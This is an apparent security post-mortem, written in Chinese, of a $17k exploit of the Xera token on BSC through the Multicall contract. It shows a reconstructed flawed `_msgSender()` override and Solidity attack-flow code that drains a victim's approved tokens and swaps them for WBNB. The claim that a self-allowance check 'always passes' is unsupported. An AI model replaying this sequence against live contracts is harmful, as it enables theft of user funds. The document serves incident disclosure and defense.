# MulticallWithXera Hack 根因分析报告

## 📊 执行摘要

- **项目名称**: Multicall with Xera
- **攻击日期**: 2025年8月20日
- **网络环境**: BSC
- **总损失金额**: $17,000 USD
- **攻击类型**: 访问控制缺陷 + _msgSender()漏洞
- **漏洞级别**: 🔴 严重

## 🎯 攻击概览

| 角色 | 地址 |
|------|------|
| 攻击者 | `0x00b700b9da0053009cb84400ed1e8fe251002af3` |
| 攻击合约 | `0x90be00229fe8000000009e007743a485d400c3b7` |
| 受害者 | `0x9a619Ae8995A220E8f3A1Df7478A5c8d2afFc542` |
| Multicall合约 | `0xcA11bde05977b3631167028862bE2a173976CA11` |
| Xera代币 | `0x93E99aE6692b07A36E7693f4ae684c266633b67d` |

- **攻击交易**: [`0xed6fd61c1eb2858a1594616ddebaa414ad3b732dcdb26ac7833b46803c5c18db`](https://bscscan.com/tx/0xed6fd61c1eb2858a1594616ddebaa414ad3b732dcdb26ac7833b46803c5c18db)
- Twitter: https://x.com/TenArmorAlert/status/1958354933247590450

## 💻 技术分析

### 核心漏洞

**Xera代币的_msgSender()实现错误**：

```solidity
// Xera代币错误地实现了_msgSender()
contract Xera is ERC20 {
    function _msgSender() internal view override returns (address) {
        // 🚨 致命错误：当通过multicall调用时
        // _msgSender()返回的是multicall中的原始调用者
        // 而不是multicall合约本身
        
        if (msg.sender == MULTICALL_CONTRACT) {
            // 从calldata中提取原始sender
            // 但这个逻辑有缺陷！
            return address(bytes20(msg.data[msg.data.length - 20:]));
        }
        return msg.sender;
    }
    
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        address spender = _msgSender();  // 🚨 这里获取错误的sender
        
        // 检查授权
        require(allowance[from][spender] >= amount, "Insufficient allowance");
        
        // 执行转账
        _transfer(from, to, amount);
        allowance[from][spender] -= amount;
        
        return true;
    }
}
```

**攻击原理**：
1. 受害者授权了Multicall: `Xera.approve(Multicall, MAX)`
2. 攻击者通过Multicall.aggregate3调用Xera.transferFrom
3. Xera的_msgSender()误认为调用者是受害者
4. 授权检查通过：`allowance[受害者][受害者]`总是足够
5. 资金被转走

### 攻击流程

```solidity
// 1. 构造transferFrom调用
bytes memory data = abi.encodeCall(
    IERC20.transferFrom,
    (victim, cakeLP, 27900000000000000000000000)
);

// 2. 通过Multicall执行
IMulticall.Call3 memory call = IMulticall.Call3({
    target: xera,
    allowFailure: false,
    callData: data
});

// 3. Multicall调用Xera
Multicall.aggregate3([call]);

// 4. Xera内部：
// _msgSender() 误认为 = victim
// 检查: allowance[victim][victim] ✅ 总是通过
// 转账: victim → cakeLP

// 5. 从LP swap获得WBNB
cakeLP.swap(0, 41 ether, attacker, "");
```

## 🎯 根本原因

### 为什么导致Hack？

**_msgSender()实现错误**：
- 试图从calldata提取原始caller
- 但逻辑有缺陷，被攻击者利用
- 导致授权检查失效

### 修复建议

```solidity
// ✅ 永远不要自定义_msgSender()
function _msgSender() internal view returns (address) {
    return msg.sender;  // 使用标准实现
}

// 或者正确验证multicall场景
function transferFrom(address from, address to, uint256 amount) public override {
    address spender = msg.sender;  // 始终用msg.sender
    
    // 如果是multicall，也应该检查multicall的授权
    require(
        allowance[from][spender] >= amount,
        "Insufficient allowance"
    );
    
    // ...
}
```

## 📝 总结

MulticallWithXera攻击利用Xera代币错误的_msgSender()实现，通过Multicall调用绕过授权检查，窃取$17k。

**教训**:
- ⚠️ 不要自定义_msgSender()除非完全理解
- ⚠️ Multicall场景需要特别小心
- ⚠️ 使用OpenZeppelin标准实现

---
**报告生成时间**: 2025-10-12  
**版本**: 1.0

